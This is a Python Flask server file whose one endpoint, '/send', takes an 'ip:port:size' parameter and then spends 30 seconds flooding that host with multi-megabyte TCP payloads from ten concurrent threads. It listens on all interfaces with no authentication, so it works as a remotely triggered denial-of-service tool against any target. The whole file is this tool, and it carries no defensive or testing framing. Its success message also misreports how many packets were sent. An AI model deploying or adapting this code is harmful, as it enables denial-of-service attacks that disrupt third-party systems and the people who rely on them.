from flask import Flask, request, jsonify
import socket
import time
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

def send_packet(ip, port, packet):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((ip, port))
            sock.sendall(packet)
            return True
    except Exception as e:
        return False

@app.route('/send', methods=['GET'])
def send_flood():
    host_param = request.args.get('host', '')

    try:
        # Parse host parameter
        ip, port, size = host_param.split(':')
        port = int(port)
        size = int(size)  # Size in MB
        packet_size = size * 1024 * 1024  # Convert MB to bytes
        packet = b'a' * packet_size  # Create the packet
        flood_duration = 30  # Duration of the flood in seconds
        concurrent_count = 10  # Number of concurrent sends

        start_time = time.time()
        end_time = start_time + flood_duration

        # Use ThreadPoolExecutor to manage concurrent sending
        with ThreadPoolExecutor(max_workers=concurrent_count) as executor:
            futures = []
            while time.time() < end_time:
                for _ in range(concurrent_count):
                    futures.append(executor.submit(send_packet, ip, port, packet))

            # Check results of futures
            results = [future.result() for future in futures]
            success_count = sum(1 for result in results if result)

        return jsonify({
            'status': 'success',
            'message': f'Sent {concurrent_count * flood_duration} packets of {size} MB to {ip}:{port}',
            'successful_sends': success_count,
            'failed_sends': len(futures) - success_count
        }), 200

    except ValueError:
        return jsonify({'status': 'error', 'message': 'Invalid host parameter format. Use format: ip:port:size'}), 400

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
        
